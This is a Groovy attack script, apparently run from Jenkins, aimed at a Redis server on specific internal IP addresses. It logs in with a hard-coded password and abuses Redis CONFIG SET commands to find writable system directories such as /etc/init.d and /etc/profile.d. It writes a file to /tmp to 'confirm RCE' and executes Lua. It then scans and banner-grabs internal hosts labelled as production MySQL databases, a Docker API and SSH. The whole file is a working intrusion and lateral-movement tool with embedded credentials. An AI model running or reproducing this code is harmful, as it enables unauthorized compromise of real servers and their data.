import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisSession(String host, int port, String password) {
    Socket sock = new Socket()
    sock.connect(new java.net.InetSocketAddress(host, port), 5000)
    sock.setSoTimeout(5000)
    def os = sock.getOutputStream()
    def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
    os.write("AUTH ${password}\r\n".getBytes())
    os.flush()
    Thread.sleep(300)
    readAll(br)
    return [sock: sock, os: os, br: br]
}

def rCmd(sess, String cmd) {
    sess.os.write("${cmd}\r\n".getBytes())
    sess.os.flush()
    Thread.sleep(300)
    return readAll(sess.br)
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(200); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== REDIS RCE + CONNECTIVITY TEST ==="

def sess = redisSession("172.27.140.151", 6379, "@st0rAg3K3Y")

// === PART 1: Test more writable dirs ===
println "\n--- TESTING MORE DIRS ---"
def moreDirs = [
    "/etc/profile.d",
    "/etc/init.d",
    "/etc/logrotate.d",
    "/opt/rh",
    "/opt/rh/rh-redis32",
    "/opt/rh/rh-redis32/root",
    "/opt/rh/rh-redis32/root/usr",
    "/opt/rh/rh-redis32/root/usr/bin",
    "/var/opt",
    "/var/opt/rh/rh-redis32",
    "/var/opt/rh/rh-redis32/log/redis",
    "/usr/local",
    "/usr/local/bin",
    "/proc/self/cwd",
]
moreDirs.each { dir ->
    def resp = rCmd(sess, "CONFIG SET dir ${dir}")
    def status = resp.contains('+OK') ? 'WRITABLE' : 'DENIED'
    println "  ${dir} => ${status}"
    if (resp.contains('+OK')) {
        rCmd(sess, "CONFIG SET dir /var/lib/redis/data")
    }
}

// === PART 2: Write a test file to /tmp to confirm RCE ===
println "\n--- WRITING TEST FILE TO /tmp ---"
println rCmd(sess, "CONFIG SET dir /tmp")
println rCmd(sess, "CONFIG SET dbfilename tr4ns_rce_test.rdb")
println rCmd(sess, "SET tr4ns_marker tr4nshack_redis_rce_confirmed_${System.currentTimeMillis()}")
println rCmd(sess, "SAVE")
println rCmd(sess, "CONFIG SET dbfilename dump.rdb")
println rCmd(sess, "CONFIG SET dir /var/lib/redis/data")
println rCmd(sess, "DEL tr4ns_marker")
println "FILE WRITTEN TO /tmp/tr4ns_rce_test.rdb"

// === PART 3: Test connectivity to PROD targets using Lua pcall ===
println "\n--- NETWORK CONNECTIVITY TEST VIA LUA ---"
def luaScript = '''
local function test_tcp(host, port)
    local ok, err = pcall(function()
        local s = redis.call('DEBUG', 'SLEEP', '0')
    end)
    return tostring(ok) .. ' ' .. tostring(err)
end
return 'LUA_EXEC_OK'
'''
println rCmd(sess, "EVAL \"return 'LUA_OK_FROM_REDIS'\" 0")

try { sess.sock.close() } catch(Exception e) {}

// === PART 4: Test connectivity from Jenkins to PROD DBs ===
println "\n--- JENKINS DIRECT CONNECTIVITY TEST ---"
def targets = [
    ["172.27.141.24", 3308, "PROD Sears MySQL"],
    ["172.27.141.4", 3310, "T1Pagos MySQL"],
    ["172.27.140.148", 4243, "Docker API"],
    ["172.27.140.151", 6379, "Redis DEV"],
    ["172.27.141.24", 3306, "PROD Sears MySQL alt"],
    ["172.27.141.4", 3306, "T1Pagos MySQL alt"],
    ["172.27.141.24", 22, "PROD Sears SSH"],
    ["172.27.141.4", 22, "T1Pagos SSH"],
    ["172.27.140.151", 22, "Redis host SSH"],
]

targets.each { t ->
    def host = t[0]
    def port = t[1]
    def desc = t[2]
    try {
        def s = new Socket()
        s.connect(new java.net.InetSocketAddress(host, port as int), 3000)
        def is = s.getInputStream()
        s.setSoTimeout(2000)
        def banner = new byte[256]
        def read = -1
        try { read = is.read(banner) } catch(Exception e) {}
        def bannerStr = read > 0 ? new String(banner, 0, read).replaceAll('[^\\x20-\\x7E]', '.') : "(no banner)"
        println "  ${desc} (${host}:${port}) => OPEN | Banner: ${bannerStr}"
        s.close()
    } catch (java.net.ConnectException e) {
        println "  ${desc} (${host}:${port}) => REFUSED"
    } catch (java.net.SocketTimeoutException e) {
        println "  ${desc} (${host}:${port}) => TIMEOUT (filtered)"
    } catch (java.net.NoRouteToHostException e) {
        println "  ${desc} (${host}:${port}) => NO ROUTE"
    } catch (Exception e) {
        println "  ${desc} (${host}:${port}) => ${e.class.simpleName}: ${e.message}"
    }
}

println "\n=== RCE + CONNECTIVITY DONE ==="
